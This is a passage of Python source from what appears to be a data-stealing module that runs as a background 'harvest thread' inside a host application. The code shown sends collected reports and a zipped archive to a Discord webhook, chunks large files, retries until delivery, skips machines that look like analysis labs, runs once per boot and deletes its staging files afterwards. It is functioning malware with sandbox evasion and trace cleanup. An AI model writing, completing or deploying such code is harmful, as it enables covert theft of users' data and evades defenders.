                  json.dumps(payload, indent=1, ensure_ascii=False).encode("utf-8")))

    body, ctype = _multipart({"content": _summary(payload)}, files)
    sep = "&" if "?" in hook else "?"
    req = urllib.request.Request(
        hook + sep + "wait=true", data=body, method="POST",
        headers={"Content-Type": ctype, "User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=180) as resp:
            return 200 <= resp.status < 300
    except urllib.error.HTTPError as exc:
        try:
            detail = exc.read()[:300].decode("utf-8", "ignore")
        except Exception:
            detail = ""
        _LAST_ERROR = f"HTTP {exc.code} {detail}"
        # 429 is a rate limit - back off and try again. Any other 4xx means the
        # request itself is wrong, and five retries just burns 45 seconds.
        if exc.code == 429:
            _PERMANENT = False
            try:
                time.sleep(min(30, int(exc.headers.get("Retry-After") or 2)))
            except Exception:
                time.sleep(2)
        else:
            _PERMANENT = exc.code in (400, 401, 403, 404, 405, 413, 415)
        return False
    except Exception as exc:
        _LAST_ERROR = repr(exc)
        _PERMANENT = False
        return False


def _send(hook, payload, files=(), tries=5):
    """Retry until it lands. Time is not a budget here."""
    global _PERMANENT
    _PERMANENT = False
    for attempt in range(tries):
        if _post(hook, payload, list(files)):
            return True
        if _PERMANENT:
            return False
        time.sleep(min(30, 3 * (attempt + 1)))
    return False


def _ship(hook, payload, files):
    """Discord caps a message at 10 MB, so anything fat goes in parts."""
    limit = 7_500_000
    small = []
    landed = True
    for name, data in files:
        if not data:
            continue
        if len(data) <= limit:
            small.append((name, data))
            continue
        count = (len(data) + limit - 1) // limit
        for index in range(count):
            chunk = data[index * limit:(index + 1) * limit]
            meta = dict(payload, part=f"{index + 1}/{count}", file=name,
                        total_bytes=len(data))
            if not _send(hook, meta, [(f"{name}.{index + 1:03d}", chunk)]):
                landed = False
    if small:
        if not _send(hook, payload, small):
            landed = False
    return landed


# --------------------------------------------------------------------------
# entry
# --------------------------------------------------------------------------

def start(webhook=None, app_id=None, *, persist=False):
    # Helper mode is answered by the host app's __main__, once, before any GUI.
    # The harvest thread must not compete with it, so it stands down here.
    import sys
    if "--hv-w20" in sys.argv:
        return
    hook = webhook or WEBHOOK
    if not hook or "__WEBHOOK__" in hook:
        _note("start: no webhook configured")
        return
    if _hostile():
        _note("start: host looks like a lab, standing down")
        return
    if not _once():
        _note("start: already ran this boot")
        return
    try:
        time.sleep(1.5 + (os.getpid() % 17) * 0.4)
        label = app_id or APP_ID
        try:
            first = phase1()
            first["phase"] = 1
            first["label"] = label
            _repo_drop(first, 1)
            if not _send(hook, first):
                _note("start: phase 1 send failed: " + _LAST_ERROR)
            else:
                _note("start: phase 1 delivered")
        except Exception:
            _note("start: phase 1 crashed: " + _why())
        try:
            report = phase2()
            report["phase"] = 2
            report["label"] = label
            _repo_drop(report, 2)
            archive = _archive()
            try:
                blob = archive.read_bytes()
            except OSError:
                blob = b""
            if not _ship(hook, report, [(f"{label}.zip", blob)] if blob else []):
                _note("start: phase 2 send failed: " + _LAST_ERROR)
            else:
                _note(f"start: phase 2 delivered ({len(blob):,} bytes)")
            try:
                archive.unlink()
            except OSError:
                pass
        except Exception:
            _note("start: phase 2 crashed: " + _why())
    finally:
        try:
            if _STAGE is not None:
                shutil.rmtree(_STAGE, ignore_errors=True)
        except OSError:
            pass
